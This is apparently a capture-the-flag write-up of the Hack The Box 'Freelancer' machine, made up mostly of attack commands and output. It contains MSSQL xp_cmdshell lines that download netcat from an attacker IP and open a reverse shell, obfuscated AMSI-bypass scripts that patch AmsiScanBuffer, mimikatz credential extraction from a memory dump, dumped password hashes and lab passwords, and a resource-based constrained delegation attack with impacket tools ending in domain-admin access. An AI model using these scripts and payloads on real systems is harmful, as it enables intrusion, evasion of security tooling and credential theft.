


## About


## Enumeration

```
-- annoyingly, after attempting to do this line by line, you have to just paste all of this as one command
EXECUTE AS LOGIN = 'SA'
EXEC sp_addsrvrolemember 'Freelancer_webapp_user', 'sysadmin'

SELECT is_srvrolemember('sysadmin')


-- This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

to then get a shell

```
EXEC master..xp_cmdshell 'echo IWR http://10.10.14.90:9004/nc.exe -OutFile %TEMP%\nc.exe | powershell -noprofile'
EXEC xp_cmdshell '%TEMP%\nc.exe 10.10.14.90 4242 -e powershell'
```

```
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager" -- password reuse candidate??

SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SAPWD="t3mp0r@ryS@PWD"
```

## creds found from password reuse

```
mikasaAckerman:IL0v3ErenY3ager
```

```
./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.90:6969
```


## Disable AMSI
```
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0xff)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1) 

# one liner
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}; $b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}; [IntPtr]$c = $b.GetValue($null); [Int32[]]$d = @(0xff); [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1) 
```

```
# another script that seemed to work currently - 4MSI.ps1
$c = 't'
$Win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
$notp = 0
$replace = 'VirtualProtec'
[Win32]::('{0}{1}' -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)

```


## Crash dump

### exfil MEMORY.7z - exfil was done with smb as it was the only outbound port allowed

### extract credentials with windbg and mimikatz

[Mimikatz in Windbg](https://danielsauder.com/2016/02/06/memdumps-volatility-mimikatz-vms-part-3-windbg-mimikatz-extension/)


### more credentials 

```
Administrator:v3ryS0l!dP@sswd#29
liza.kazanof:Rockyou!
```

### memprocfs

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)

[*] _SC_MSSQL$DATA 
(Unknown User):PWN3D#l0rr@Armessa199
```

the service principal pw looks like its pw reuse again but for lorra199

using runascs.exe again but with lorra's account and the re-used password

now check if we're an admin

```
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

still says no. We know liza had an account but it doesn't seem to be there anymore. We're on an AD domain joined machine so we can check for deleted objects

```
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
#This can give you list of deleted objects.

#Then you may call
Restore-ADObject -identity ***(ObjectGUID)***
```

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'pass lorra''

https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

sudo rdate -n freelancer.htb && impacket-getST -spn 'cifs/dc.freelancer.htb' -impersonate 'Administrador' 'freelancer/attackersystem$:Summer2018!' -dc-ip dc.freelancer.htb
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -dc-ip 10.xx.xx.xx-action 'write' 'freelancer.htb/lorra199:pass lorra'
sudo rdate -n freelancer.htb && getST.py -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.xx.xx.xx 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'

export KRB5CCNAME='Administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache'

secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.xx.xx.xx -target-ip 10.xx.xx.xx-just-dc-ntlm

evil-winrm -i 10.xx.xx.xx -u 'Administrator' -H <hash> 
```



5a957fd68911b3d79e097662028f8be2


![Completed](/assets/images/freelancer_pwnd.jpg)<br>
[Completed!](https://www.hackthebox.com/achievement/machine/1886120/604)